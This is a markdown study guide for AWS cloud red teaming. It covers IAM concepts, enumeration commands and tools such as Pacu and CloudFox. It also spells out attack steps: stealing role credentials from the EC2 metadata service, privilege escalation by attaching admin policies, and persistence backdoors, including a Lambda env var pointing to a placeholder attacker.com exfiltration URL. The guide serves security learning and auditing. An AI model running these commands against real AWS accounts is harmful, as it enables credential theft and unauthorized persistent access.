# 📚 AWS Red Team Study Notes 

---

## 🎯 Quick Study Guide

### The Core AWS Attack Surface

| Component | Purpose | Red Team Value |
|-----------|---------|----------------|
| **IAM** | Identity & Access Management | Credential abuse, privesc paths |
| **EC2** | Virtual Machines | IMDS abuse, lateral movement |
| **S3** | Object Storage | Data exfiltration, misconfigured buckets |
| **Lambda** | Serverless Functions | Code execution, env var secrets |
| **RDS** | Relational Databases | Data access, credential discovery |
| **ECS/EKS** | Container Orchestration | Container escape, metadata abuse |
| **CloudTrail** | Audit Logging | Detection evasion awareness |
| **STS** | Security Token Service | Temporary credential generation |

### 💡 Remember This:
> **IAM** = Identity Management (Users, Groups, Roles, Policies)
> **STS** = Short-term Credential Issuer
> **IMDS** = Instance Metadata Service (http://[IP_ADDRESS])
> **ARN** = Amazon Resource Name (unique identifier for every AWS resource)

---

## 🏗️ AWS Account Structure

### Hierarchy (Top to Bottom)
```
🏢 AWS Organization
  └── 📁 Organizational Unit (OU)
      └── 💳 AWS Account
          └── 🌍 Region
              └── 🖥️ Resource
```

### Key Identifiers
| ID Type | Example | Purpose |
|---------|---------|---------|
| **Account ID** | `123456789012` | 12-digit AWS account identifier |
| **ARN** | `arn:aws:iam::123456789012:user/bob` | Unique resource name |
| **Access Key ID** | `AKIA...` | Programmatic access key prefix |
| **User ID** | `AIDA...` | IAM user unique ID |
| **Role ID** | `AROA...` | IAM role unique ID |

### ARN Format:
```
arn:partition:service:region:account-id:resource 
arn:aws:iam::123456789012:user/alice 
arn:aws:s3:::my-bucket
arn:aws:ec2:us-east-1:123456789012:instance/i-1234567890abcdef0
```

---

## 🔑 Identity & Access Management (IAM)

### 🎯 What is IAM?
- AWS's Identity and Access Management service
- Controls **who** can do **what** on **which** AWS resource
- Global service — not region-specific
- Foundation of all AWS security

### IAM Objects

```
👤 Users     - Individual human or service accounts
👥 Groups    - Collections of users (policies attached to group)
🎭 Roles     - Assumed by services, users, or external entities
📜 Policies  - JSON documents defining permissions
```

### IAM Policy Types

| Policy Type | Attached To | Use Case |
|-------------|------------|---------|
| **Managed Policy (AWS)** | User/Group/Role | AWS pre-built, read-only |
| **Managed Policy (Customer)** | User/Group/Role | Custom, reusable |
| **Inline Policy** | Single entity | One-off, tight coupling |
| **Resource-based Policy** | Resource (S3, etc.) | Cross-account access |
| **Permission Boundary** | User/Role | Maximum permission ceiling |
| **SCP (Service Control Policy)** | OU/Account | Org-level guardrails |

### IAM Policy Structure (JSON):
```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": "s3:GetObject",
      "Resource": "arn:aws:s3:::my-bucket/*",
      "Condition": {
        "IpAddress": {
          "aws:SourceIp": "192.168.1.0/24"
        }
      }
    }
  ]
}
```

### Policy Evaluation Logic:
```
Default DENY → Explicit ALLOW → Explicit DENY wins
           ↑
     SCPs can restrict even Allows
```

### IAM Roles vs Users

| Feature | IAM User | IAM Role |
|---------|----------|----------|
| Credentials | Long-term (password/keys) | Short-term (STS tokens) |
| Assumed by | Human logins | Services, users, external |
| MFA | Optional | Can require |
| Best Practice | Human access | Machine/service access |

### Trust Policy (Who Can Assume a Role):
```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {
        "Service": "ec2.amazonaws.com"
      },
      "Action": "sts:AssumeRole"
    }
  ]
}
```

---

## 🔐 Authentication Methods

### Access Types

| Type | Method | Credentials |
|------|--------|-------------|
| **Console (GUI)** | Username + Password | Long-term |
| **Programmatic** | Access Key ID + Secret | Long-term |
| **Assumed Role** | STS `AssumeRole` | Short-term |
| **EC2 Instance Profile** | IMDS endpoint | Automatic/Rotated |
| **OIDC/SAML Federation** | External IdP | Short-term |

### Long-term Credentials:
```
Access Key ID:     AKIAIOSFODNN7EXAMPLE
Secret Access Key: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
```
> ⚠️ These never expire unless manually rotated or deleted!

### Short-term Credentials (STS):
```
Access Key ID:     ASIAIOSFODNN7EXAMPLE  (starts with ASIA)
Secret Access Key: <secret>
Session Token:     <long-token-string>
Expiration:        1-12 hours
```


 AKI long-term 
 ASA short-term 


### AWS CLI Authentication:
```bash
# Configure default profile
aws configure

# Configure named profile
aws configure --profile pentest

# Set environment variables (short-term, in-memory)
export AWS_ACCESS_KEY_ID=AKIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...   # Only for assumed roles/STS

# Use named profile
aws s3 ls --profile pentest
```

### Credential File Location:
```bash
# Linux/Mac
~/.aws/credentials
~/.aws/config

# Windows
C:\Users\<user>\.aws\credentials
C:\Users\<user>\.aws\config
```

### Credential File Format:
```ini
[default]
aws_access_key_id = AKIA...
aws_secret_access_key = ...

[pentest]
aws_access_key_id = AKIA...
aws_secret_access_key = ...
region = us-east-1
```

---

## 🔍 Enumeration Commands

### 🆔 Identity & Account Enumeration

```bash
# Who am I? (Always run first)
aws sts get-caller-identity #(sts mean Security Token Service)

# Get account summary
aws iam get-account-summary

# List account aliases
aws iam list-account-aliases # (Alias is a nickname for an account)

# Get password policy
aws iam get-account-password-policy # (Password policy is a set of rules that define the strength of passwords) 
```

### 👤 User Enumeration

```bash
# List all IAM users
aws iam list-users

# Get specific user details
aws iam get-user --user-name <username>

# List user's access keys
aws iam list-access-keys --user-name <username>

# List groups a user belongs to
aws iam list-groups-for-user --user-name <username>

# List policies attached to user
aws iam list-attached-user-policies --user-name <username>

# List inline policies on user
aws iam list-user-policies --user-name <username>

# Get inline policy document
aws iam get-user-policy --user-name <username> --policy-name <policyname>

# List MFA devices for user
aws iam list-mfa-devices --user-name <username>

# List signing certificates
aws iam list-signing-certificates --user-name <username>
```

### 👥 Group Enumeration

```bash
# List all groups
aws iam list-groups

# List users in a group
aws iam get-group --group-name <groupname>

# List policies attached to group
aws iam list-attached-group-policies --group-name <groupname>

# List inline policies on group
aws iam list-group-policies --group-name <groupname>
```

### 🎭 Role Enumeration

```bash
# List all roles
aws iam list-roles

# Get specific role details (includes trust policy)
aws iam get-role --role-name <rolename>

# List policies attached to role
aws iam list-attached-role-policies --role-name <rolename>

# List inline policies on role
aws iam list-role-policies --role-name <rolename>

# Get inline policy document
aws iam get-role-policy --role-name <rolename> --policy-name <policyname>

# List instance profiles (roles attached to EC2)
aws iam list-instance-profiles
aws iam get-instance-profile --instance-profile-name <name>
```

### 📜 Policy Enumeration

```bash
# List all customer-managed policies
aws iam list-policies --scope Local

# List all AWS-managed policies
aws iam list-policies --scope AWS

# List all policies (both)
aws iam list-policies

# Get policy details
aws iam get-policy --policy-arn <arn>

# Get policy version (actual document)
aws iam get-policy-version --policy-arn <arn> --version-id v1

# List all versions of a policy
aws iam list-policy-versions --policy-arn <arn>

# List all entities using a policy
aws iam list-entities-for-policy --policy-arn <arn>
```

### 🖥️ EC2 Enumeration

```bash
# List all EC2 instances
aws ec2 describe-instances

# List instances in a specific region
aws ec2 describe-instances --region us-east-1

# Get instance metadata (output filter)
aws ec2 describe-instances --query 'Reservations[*].Instances[*].[InstanceId,InstanceType,State.Name,PublicIpAddress,PrivateIpAddress,IamInstanceProfile]' --output table

# List security groups
aws ec2 describe-security-groups

# List key pairs
aws ec2 describe-key-pairs

# List all regions
aws ec2 describe-regions

# List snapshots (yours)
aws ec2 describe-snapshots --owner-ids self

# List AMIs (yours)
aws ec2 describe-images --owners self

# List VPCs
aws ec2 describe-vpcs

# List subnets
aws ec2 describe-subnets
```

### 🪣 S3 Enumeration

```bash
# List all buckets
aws s3 ls
aws s3api list-buckets

# List bucket contents
aws s3 ls s3://<bucket-name>/
aws s3 ls s3://<bucket-name>/ --recursive

# Get bucket ACL
aws s3api get-bucket-acl --bucket <bucket-name>

# Get bucket policy
aws s3api get-bucket-policy --bucket <bucket-name>

# Check public access block settings
aws s3api get-public-access-block --bucket <bucket-name>

# Get bucket versioning
aws s3api get-bucket-versioning --bucket <bucket-name>

# Get bucket location (region)
aws s3api get-bucket-location --bucket <bucket-name>

# Download a file
aws s3 cp s3://<bucket>/<key> ./local-file

# Download entire bucket
aws s3 sync s3://<bucket-name> ./local-folder
```

### ⚡ Lambda Enumeration

```bash
# List all Lambda functions
aws lambda list-functions

# Get function details (includes env vars!)
aws lambda get-function --function-name <name>

# Get function configuration
aws lambda get-function-configuration --function-name <name>

# Get function policy (resource-based)
aws lambda get-policy --function-name <name>

# List function event source mappings
aws lambda list-event-source-mappings --function-name <name>

# List function aliases
aws lambda list-aliases --function-name <name>
```

### 🗄️ RDS Enumeration

```bash
# List all DB instances
aws rds describe-db-instances

# List DB clusters
aws rds describe-db-clusters

# List DB snapshots
aws rds describe-db-snapshots

# List DB snapshots (public ones)
aws rds describe-db-snapshots --snapshot-type public

# List DB subnet groups
aws rds describe-db-subnet-groups

# List DB security groups
aws rds describe-db-security-groups
```

### 🔐 Secrets Manager / SSM Enumeration

```bash
# List all secrets
aws secretsmanager list-secrets

# Get secret value (gold mine!)
aws secretsmanager get-secret-value --secret-id <name-or-arn>

# Describe a secret
aws secretsmanager describe-secret --secret-id <name-or-arn>

# SSM Parameter Store - list parameters
aws ssm describe-parameters

# Get SSM parameter value
aws ssm get-parameter --name <name> --with-decryption

# Get multiple parameters
aws ssm get-parameters-by-path --path / --recursive --with-decryption
```

### ☁️ CloudTrail Enumeration

```bash
# List trails
aws cloudtrail describe-trails

# Get trail status
aws cloudtrail get-trail-status --name <name>

# List event selectors (what's being logged)
aws cloudtrail get-event-selectors --trail-name <name>

# Look up recent events (last 90 days)
aws cloudtrail lookup-events --max-results 50

# Filter by event name
aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=ConsoleLogin
```

---

## 🎯 Cloud Red Team Attack Lifecycle

### Attack Flow

```
1. RECONNAISSANCE      - External scanning, OSINT, cloud asset discovery
       ↓
2. INITIAL ACCESS      - Phishing, exposed credentials, misconfigured services
       ↓
3. CREDENTIAL ACCESS   - Steal creds from metadata, env vars, config files
       ↓
4. ENUMERATION         - Discover permissions, resources, attack paths
       ↓
5. PRIVILEGE ESCALATION - Expand access using IAM misconfigurations
       ↓
6. LATERAL MOVEMENT    - Assume roles, pivot to other accounts/services
       ↓
7. PERSISTENCE         - Backdoor accounts, create access keys, hidden roles
       ↓
8. COLLECTION          - Access S3 buckets, databases, secrets
       ↓
9. EXFILTRATION        - Extract sensitive data
       ↓
10. IMPACT             - Ransomware, destruction, cryptomining
```

### Phase Details

**1. Reconnaissance:**
```bash
# DNS-based discovery
dig <domain>
nslookup <domain>

# Enumerate public S3 buckets (guessing)
# Buckets follow pattern: <name>.s3.amazonaws.com
curl -s https://<bucket-name>.s3.amazonaws.com

# Check for AWS usage
curl https://login.microsoftonline.com/getuserrealm.srf?login=user@domain.com&xml=1
# (Azure, but same concept of cloud detection applies)

# AWS-specific OSINT tooling
# GitLeaks, truffleHog - scan repos for exposed AWS keys

or use my tool! :)
[![CloudDetect](https://img.shields.io/badge/CloudDetect-5391FE?style=for-the-badge&logo=awscli&logoColor=white)](https://github.com/XxrzxX/CloudDetect.git)
```

**2. Initial Access - Common Entry Points:**
```
✅ Exposed Access Keys in:
   - GitHub repositories (git history too!)
   - Hardcoded in application code
   - Environment variables
   - Docker images
   - CI/CD pipeline logs

✅ Misconfigured S3 buckets (public read/write)
✅ IMDSv1 SSRF vulnerabilities
✅ Lambda function code exposure
✅ Phishing for AWS console credentials
✅ Third-party integrations with excessive permissions
```

**3. Credential Access via IMDS (EC2 Metadata Service):**
```bash
# IMDSv1 (no auth required - vulnerable to SSRF!)
curl http://[IP_ADDRESS]/latest/meta-data/

# Get IAM role name attached to instance
curl http://[IP_ADDRESS]/latest/meta-data/iam/security-credentials/

# Get credentials for the role
curl http://[IP_ADDRESS]/latest/meta-data/iam/security-credentials/<role-name>

# Response gives:
# {
#   "Code": "Success",
#   "Type": "AWS-HMAC",
#   "AccessKeyId": "ASIA...",
#   "SecretAccessKey": "...",
#   "Token": "...",
#   "Expiration": "..."
# }

# Other useful IMDS endpoints
curl http://[IP_ADDRESS]/latest/meta-data/hostname
curl http://[IP_ADDRESS]/latest/meta-data/public-ipv4
curl http://[IP_ADDRESS]/latest/meta-data/instance-id
curl http://[IP_ADDRESS]/latest/user-data   # Often contains secrets!
```

> ⚠️ **IMDSv2 Mitigation**: Requires a PUT request first to get a token — SSRF attacks are much harder. 

```bash
# IMDSv2 (requires session token)
TOKEN=$(curl -X PUT "http://[IP_ADDRESS]/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")

curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://[IP_ADDRESS]/latest/meta-data/iam/security-credentials/<role-name>
```

---

## ⬆️ Privilege Escalation Techniques

### Common IAM PrivEsc Paths

| Technique | Requirement | Result |
|-----------|------------|--------|
| `iam:AttachUserPolicy` | Can attach policies | Attach `AdministratorAccess` |
| `iam:PutUserPolicy` | Can put inline policies | Add inline admin policy |
| `iam:AttachRolePolicy` | Can attach to roles | Escalate role permissions |
| `iam:CreatePolicyVersion` | Can create new versions | Replace policy with admin |
| `iam:SetDefaultPolicyVersion` | Can set default version | Activate admin version |
| `iam:PassRole` + `ec2:RunInstances` | Both permissions | Launch EC2 with privileged role |
| `iam:PassRole` + `lambda:CreateFunction` | Both permissions | Run Lambda with privileged role |
| `iam:CreateAccessKey` | Target another user | Create keys for another user |
| `iam:UpdateLoginProfile` | Can update profile | Change another user's password |
| `sts:AssumeRole` | Assume privileged role | Inherit role permissions |

### PrivEsc Examples:

**Attach Admin Policy to Self:**
```bash
aws iam attach-user-policy \
  --user-name <your-username> \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

**Create New Admin Policy Version:**
```bash
aws iam create-policy-version \
  --policy-arn <target-policy-arn> \
  --policy-document file://admin_policy.json \
  --set-as-default
```

**Add Inline Policy:**
```bash
aws iam put-user-policy \
  --user-name <username> \
  --policy-name admin-backdoor \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}'
```

**Assume a Privileged Role:**
```bash
aws sts assume-role \
  --role-arn arn:aws:iam::<account-id>:role/<privileged-role> \
  --role-session-name pentest-session

# Export the returned credentials
export AWS_ACCESS_KEY_ID=<AccessKeyId>
export AWS_SECRET_ACCESS_KEY=<SecretAccessKey>
export AWS_SESSION_TOKEN=<SessionToken>
```

**iam:PassRole + Lambda for PrivEsc:**
```bash
# Create Lambda with privileged role
aws lambda create-function \
  --function-name privesc-func \
  --runtime python3.9 \
  --role arn:aws:iam::<account-id>:role/<privileged-role> \
  --handler lambda_function.lambda_handler \
  --zip-file fileb://function.zip

# Invoke it to run as the privileged role
aws lambda invoke --function-name privesc-func output.txt
```

---

## 🔄 Lateral Movement

### Cross-Account Role Assumption

```bash
# Check if you can assume a role in another account
aws sts assume-role \
  --role-arn arn:aws:iam::<other-account-id>:role/<role-name> \
  --role-session-name lateral-move

# List roles with cross-account trust policies
aws iam list-roles --query 'Roles[?contains(AssumeRolePolicyDocument, `arn:aws:iam`)]'
```

### Service-to-Service Movement

```bash
# From compromised Lambda: Access S3
import boto3
s3 = boto3.client('s3')
s3.list_buckets()

# From compromised EC2: Access RDS credentials via Secrets Manager
aws secretsmanager get-secret-value --secret-id prod/rds/password

# Access ECS task metadata (similar to IMDS)
curl http://[IP_ADDRESS]/v2/credentials/<UUID>

# EKS - access service account credentials
cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

---

## 🏗️ Persistence Techniques

### Create Backdoor Access Key

```bash
# Create a new access key for existing user (stealthy)
aws iam create-access-key --user-name <target-user>

# Create a brand new IAM user
aws iam create-user --user-name svc-backup

# Attach admin policy to new user
aws iam attach-user-policy \
  --user-name svc-backup \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# Create access key for new user
aws iam create-access-key --user-name svc-backup
```

### Lambda Backdoor

```bash
# Create persistent Lambda triggered on schedule
aws events put-rule \
  --schedule-expression "rate(5 minutes)" \
  --name beacon-rule \
  --state ENABLED

# Or add a backdoor to existing Lambda by updating env vars
aws lambda update-function-configuration \
  --function-name <legit-function> \
  --environment Variables={EXFIL_URL=https://attacker.com}
```

### Console Access Backdoor

```bash
# Create console login profile for user (if they only had programmatic access)
aws iam create-login-profile \
  --user-name <username> \
  --password P@ssw0rd123! \
  --no-password-reset-required
```

---

## 🛠️ Tools

### AWS CLI Essentials

```bash
# Output formatting
aws iam list-users --output json
aws iam list-users --output table
aws iam list-users --output text

# JMESPath query filtering
aws ec2 describe-instances --query 'Reservations[*].Instances[*].InstanceId'

# Profile switching
aws sts get-caller-identity --profile hacked-account

# Region override
aws s3 ls --region eu-west-1

# Debug mode (shows raw HTTP requests)
aws s3 ls --debug 2>&1 | head -50
```

### Pacu - AWS Exploitation Framework

```bash
# Install
pip3 install pacu # (Pacu is an AWS exploitation framework)

# Start pacu
pacu

# Core commands
set_keys                    # Set AWS credentials
whoami                      # Get caller identity
run iam__enum_permissions   # Enumerate current user permissions
run iam__enum_users_roles_policies_groups  # Full IAM enum
run s3__bucket_finder       # Find S3 buckets
run ec2__enum               # Enumerate EC2 resources
run privesc__all_who_can    # Find all PrivEsc paths
run iam__privesc_scan       # Check for current user privesc
run lambda__enum            # Enumerate Lambda functions
run cloudtrail__download_event_history  # Download CT logs
run secretsmanager__enum    # Enumerate secrets
```

### ScoutSuite - Multi-Cloud Security Auditing

```bash
# Install
pip3 install scoutsuite # (ScoutSuite is a multi-cloud security auditing tool)

# Run against AWS
scout aws

# With specific profile
scout aws --profile pentest

# Export report
scout aws --report-dir ./scout-report
```

### CloudMapper

```bash
# Enumerate AWS environment
python3 cloudmapper.py gather --account <account-name>

# Generate network diagram
python3 cloudmapper.py prepare --account <account-name>
python3 cloudmapper.py webserver
```

### Enumerate Permissions Tool

```bash
# enumerate-iam (brute-force what current creds can do)
git clone https://github.com/andresriancho/enumerate-iam
cd enumerate-iam
pip3 install -r requirements.txt
python3 enumerate-iam.py --access-key AKIA... --secret-key ...
```

### CloudFox

```bash
# Find attack paths in AWS environments
cloudfox aws --profile pentest all-checks
cloudfox aws --profile pentest permissions --principal arn:aws:iam::123456789012:user/bob
cloudfox aws --profile pentest role-trusts
```

---

## 🔴 Security Misconfigurations

### High-Risk Scenarios

| # | Misconfiguration | Risk | Check |
|---|-----------------|------|-------|
| 1 | **Public S3 Buckets** | Data breach | `aws s3api get-bucket-acl` |
| 2 | **IMDSv1 Enabled** | SSRF → credential steal | Check instance metadata options |
| 3 | **No MFA on Root** | Full account takeover | IAM credential report |
| 4 | **Wildcard Policies (`*`)** | Overprivilege | Policy review |
| 5 | **Long-term Root Access Keys** | Account compromise | `aws iam list-access-keys` |
| 6 | **Public RDS Snapshots** | Data breach | `aws rds describe-db-snapshots` |
| 7 | **Overprivileged Lambda Roles** | PrivEsc path | Lambda env + role check |
| 8 | **No CloudTrail Logging** | Attacker operates undetected | `aws cloudtrail describe-trails` |
| 9 | **Cross-Account Trust Without Condition** | Account hopping | Role trust policies |
| 10 | **Secrets in Lambda Env Vars** | Credential exposure | `aws lambda get-function` |
| 11 | **EC2 Instance with Admin Role** | Full cloud compromise from EC2 | Instance profile check |
| 12 | **InlinePolicy with `iam:*`** | Full IAM control | Policy document review |

### Red Team Targets (Priority Order)

```
🥇 Root Account       - Lord mode, no restrictions
🥈 IAM Admin Users    - AdministratorAccess policy
🥉 Roles with iam:*   - Can create/modify any IAM entity
4️⃣  Service Accounts   - Often over-permissioned, rarely audited
5️⃣  CI/CD Pipelines   - Access keys in env vars
6️⃣  Lambda Functions   - Code + role = PrivEsc path
7️⃣  EC2 Instances     - IMDS + misconfigured roles
```

### Critical Attack Checks

```bash
# Check for admin users
aws iam list-users --query 'Users[*].UserName' | xargs -I{} aws iam list-attached-user-policies --user-name {} --query 'AttachedPolicies[?PolicyName==`AdministratorAccess`]'

# Find roles assumable by EC2
aws iam list-roles --query 'Roles[?contains(AssumeRolePolicyDocument.Statement[].Principal.Service, `ec2.amazonaws.com`)].[RoleName,Arn]'

# Find overly permissive policies
aws iam list-policies --scope Local --query 'Policies[*].Arn' | xargs -I{} aws iam get-policy-version --policy-arn {} --version-id v1

# Dump IAM credential report
aws iam generate-credential-report
aws iam get-credential-report --query 'Content' --output text | base64 --decode

# Find public snapshots
aws ec2 describe-snapshots --owner-ids self --filters Name=attribute,Values=createVolumePermission --query 'Snapshots[*].[SnapshotId,Description]'
```

---

## 🌐 AWS Global Infrastructure Notes

### Key Regions (Common in Exams/Labs)

| Region Code | Location |
|------------|----------|
| `us-east-1` | N. Virginia (default, most services) |
| `us-west-2` | Oregon |
| `eu-west-1` | Ireland |
| `ap-southeast-1` | Singapore |
| `ap-northeast-1` | Tokyo |

### Global vs Regional Services

| Global | Regional |
|--------|---------|
| IAM | EC2 |
| Route 53 | S3 (data stored regionally) |
| CloudFront | RDS |
| STS | Lambda |
| WAF | ECS/EKS |

---

## 🎯 Study Tips & Quick Reference

### 📝 Key Endpoints to Memorize

```bash
# Metadata Service (inside EC2)
http://[IP_ADDRESS]/latest/meta-data/
http://[IP_ADDRESS]/latest/user-data

# ECS Task Metadata (inside container)
http://[IP_ADDRESS]/v2/credentials/<UUID>
http://[IP_ADDRESS]/v2/metadata

# S3 public endpoint format
https://<bucket-name>.s3.amazonaws.com/<key>
https://s3.amazonaws.com/<bucket-name>/<key>
https://<bucket-name>.s3.<region>.amazonaws.com/<key>

# STS endpoint
https://sts.amazonaws.com     # Global
https://sts.<region>.amazonaws.com  # Regional (preferred)
```

### Access Key ID Prefixes (Know These!)

| Prefix | Type |
|--------|------|
| `AKIA` | Long-term IAM user key |
| `ASIA` | Short-term STS/assumed role key |
| `AROA` | Role ID |
| `AIDA` | IAM User ID |
| `AGPA` | Group ID |
| `ANOL` | Policy ARN unique ID |

### 💡 Pro Tips

1. **Always run `aws sts get-caller-identity` first** — Know who you are
2. **Check `~/.aws/credentials`** on compromised machines immediately
3. **IMDS `user-data` often contains bootstrap scripts with secrets**
4. **Lambda environment variables** are a goldmine — always check
5. **`iam:PassRole`** is one of the most dangerous permissions for PrivEsc
6. **S3 bucket names are global** — namespace squatting is a thing
7. **CloudTrail has a 90-day event history** — attackers try to delete it
8. **Root account has NO permission restrictions** from SCPs
9. **STS tokens expire** — grab long-term keys when possible for persistence
10. **Cross-region enumeration**: always check all regions, not just default
11. **Resource-based policies on S3 can allow public access** even with ACL blocked
12. **Organization SCPs** can restrict even admin users — enumerate them

### Red Team Mindset for AWS

- **Follow the credentials**: Find keys → enumerate → abuse
- **Check every service**: EC2 → S3 → Lambda → Secrets → RDS
- **Trust no defaults**: Assume everything is misconfigured until proven otherwise
- **Chain vulnerabilities**: SSRF → IMDS → Creds → PrivEsc → Persistence
- **Watch the logs**: Know what CloudTrail captures, minimize footprint
- **Think cross-account**: Many orgs have dev/prod/shared services accounts

---

## 🔧 One-Liners & Quick Commands

```bash
# Dump all IAM info quickly
aws iam get-account-authorization-details > iam_dump.json

# Find all resources in all regions (use with caution - rate limits)
for region in $(aws ec2 describe-regions --query 'Regions[*].RegionName' --output text); do
  echo "=== $region ==="; aws ec2 describe-instances --region $region 2>/dev/null
done

# Check if bucket exists and is public
curl -s https://<bucket>.s3.amazonaws.com | grep -i "access denied\|No such bucket\|ListBucketResult"

# Extract creds from Lambda env vars
aws lambda list-functions --query 'Functions[*].FunctionName' --output text | \
  tr '\t' '\n' | xargs -I{} aws lambda get-function-configuration --function-name {} \
  --query 'Environment.Variables'

# Find all roles that can be assumed externally
aws iam list-roles --query 'Roles[*].[RoleName,AssumeRolePolicyDocument]' | grep -A5 "arn:aws:iam::"

# Quickly check caller identity with all profiles
grep '^\[' ~/.aws/credentials | tr -d '[]' | xargs -I{} sh -c 'echo "Profile: {}"; aws sts get-caller-identity --profile {} 2>/dev/null'
```

---

## 📚 Additional Resources

- **AWS Documentation**: https://docs.aws.amazon.com/
- **IAM Policy Reference**: https://docs.aws.amazon.com/IAM/latest/UserGuide/
- **Pacu Framework**: https://github.com/RhinoSecurityLabs/pacu
- **CloudFox**: https://github.com/BishopFox/cloudfox
- **enumerate-iam**: https://github.com/andresriancho/enumerate-iam
- **AWS Well-Architected**: https://aws.amazon.com/architecture/well-architected/
- **HackTricks AWS**: https://cloud.hacktricks.xyz/pentesting-cloud/aws-security
- **PortSwigger SSRF Labs**: https://portswigger.net/web-security/ssrf
- **Rhino Security PrivEsc**: https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/
- **ScoutSuite**: https://github.com/nccgroup/ScoutSuite
- **CloudMapper**: https://github.com/duo-labs/cloudmapper

---

*Good luck! 🚀 — Think like an attacker, secure like a defender.*
